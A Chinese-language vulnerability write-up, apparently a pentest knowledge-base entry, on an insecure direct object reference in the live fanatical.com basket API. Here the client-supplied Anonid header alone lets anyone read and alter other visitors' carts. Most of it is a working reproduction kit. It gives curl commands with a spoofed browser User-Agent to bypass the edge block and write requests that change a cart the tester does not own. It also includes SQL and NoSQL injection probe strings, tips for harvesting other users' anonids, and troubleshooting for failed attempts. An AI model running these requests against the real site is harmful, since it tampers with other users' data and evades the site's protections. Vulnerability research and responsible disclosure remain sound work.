# Fanatical /api/basket 跨身份读/写他人游客购物车（Anonid 头即身份，无属主校验）

## 一句话
`https://www.fanatical.com/api/basket` 以请求头 `Anonid`（客户端可控的 UUIDv4）作为购物车身份的**唯一定位键**，
服务端既不要求 Authorization、也不校验该 Anonid 的归属。任意取一个合法 UUIDv4 即可 **读取并改写** 该身份名下的购物车
（跨身份 IDOR）。响应仅含商品目录字段（无 PII），真实用户 anonid 为随机 UUIDv4 不易猜，故定级 low。

## 前置条件
- 网络可直达 `https://www.fanatical.com/api`（本环境直连即可；静态与 `/api` 动态路径均未被 CF 挑战）。
- **无需要任何账号 / 令牌 / Cookie**。
- 必须携带**浏览器类 User-Agent**（裸 `curl/x.y.z` UA 会被边缘拦成 `403 Request blocked`，到不了业务层）。
- `Anonid` 头必须是**合法 UUIDv4**。

## 判据（四条对照实验，缺一不可）
| # | 操作 | 期望 | 说明 |
|---|------|------|------|
| 1 | 无 Authorization，仅 `Anonid: <某 UUID>` GET | 200，返回该 UUID 名下**既有**购物车 | 读出非本人创建的内容 = 跨身份读 |
| 2 | 换随机 UUIDv4 GET | 200，`body=[]` | 证明返回是「按 Anonid 索引的既有状态」，非固定/公共数据 |
| 3 | 同 Anonid PUT / POST | 200，且回读状态随之变化 | 证明可跨身份**写**（移除/加入购物车） |
| 4 | Anonid 非 UUID / 含注入字符 | 400 `{"err":"AnonId Header not valid"}` | 证明严格 UUID 校验，无 NoSQL/SQL 注入放大 |

## 请求 / 命令

```bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

# ① 读：他人 Anonid 的购物车（此 UUID 为可猜解样本）
curl -sk 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Accept: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111'
# → HTTP/2 200  content-length: 3262
# body=[{"pid":"6ad8996f54da982291d52c59","name":"Asynchronous Programming in Python","quantity":1,...},
#       {"pid":"6ad74df030aff9d3b7048db1","name":"Feed The Pit","quantity":1,...}]
# 注意：这不是本人创建的购物车

# ② 对照：随机 UUIDv4 → 空车
curl -sk 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Anonid: 7d354cd6-0000-4000-8000-000000000000'
# → HTTP/2 200  body=[]  (len=2)

# ③ 写：PUT = 从车中移除（removeFromCart）
curl -sk -X PUT 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Content-Type: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111' \
  -d '{"productId":"6ad8996f54da982291d52c59","tierIndex":0}'
# → HTTP/2 200；随后 GET 同 Anonid，该商品已消失（只剩 feed-the-pit）

# ③ 写：POST = 加入购物车（addToCart）
curl -sk -X POST 'https://www.fanatical.com/api/basket' \
  -A "$UA" -H 'Content-Type: application/json' \
  -H 'Anonid: 11111111-1111-4111-8111-111111111111' \
  -d '{"productId":"6ad8996f54da982291d52c59","productSlug":"asynchronous-programming-in-python"}'
# → HTTP/2 200  len=3262；GET 同 Anonid，恢复为两件

# ④ 注入 / 格式对照（期望 400）
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H "Anonid: ' OR '1'='1"
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H 'Anonid: {"$ne":null}'
curl -sk 'https://www.fanatical.com/api/basket' -A "$UA" -H 'Anonid: 11111111-1111-4111-8111-11111111111'
# → 全部 HTTP/2 400  body={"err":"AnonId Header not valid"}
```

## 原理与影响边界
- **身份模型缺陷**：`Anonid` 既是「我」的标识，也是「我要操作的车」的定位键，二者未做绑定；
  服务端没有 session/token 把 Anonid 绑到调用方，等于把身份交到客户端手里。
- **泄露向量**：前端支持 `?set_anon_id=<uuid>` 参数；anonid 还会被写入第三方 analytics / tag-manager 事件，
  使攻击者可被动收集他人 anonid（这是把「不可猜」变成「可获取」的关键）。
- **影响有限（故 low）**：
  - `/api/basket` 响应仅含商品目录字段（pid/name/slug/quantity），**无姓名/邮箱/地址等 PII**；
  - 真实用户的 anonid 为随机 UUIDv4，不易枚举；
  - `/api/user/*` 一律 `401 "Missing authorization header"`，落不到账户层。
  - 可造成的实际效果：跨身份读他人选品、往他人车里增删商品（篡改/骚扰）。

## 失败常见原因
- **UA 不对**：用了 `curl/8.x` 之类非浏览器 UA → 边缘直接 `403 Request blocked`（15 字节），根本没到后端。
- **Anonid 缺省或非法**：非 UUIDv4 → `400 {"err":"AnonId Header not valid"}`；且必须是**请求头**，
  写进 query/body 无效。
- **空车误判**：目标 anonid 名下本来就没东西 → `200` 但 `body=[]`；必须用「读出非本人生成内容」+「写后回读变更」来确证，别只看 200。

## 关联
- 同站入口门禁（400 "Request blocked" 的成因与绕过，anonid 头必须存在）见 kb 条目 `fanatical-api-request-blocked-gate-bypass-anonid-header` 与 `fanatical-api-真实入口门是-anonid-uuidv4-头而非-x-fan-fp-403-reques`。
- 另注：`POST /api/basket` 亦未校验 `quantity` 下限（`quantity:-5` 可持久化），但下单强制认证，匿名态无法闭合真实影响，仅作线索。
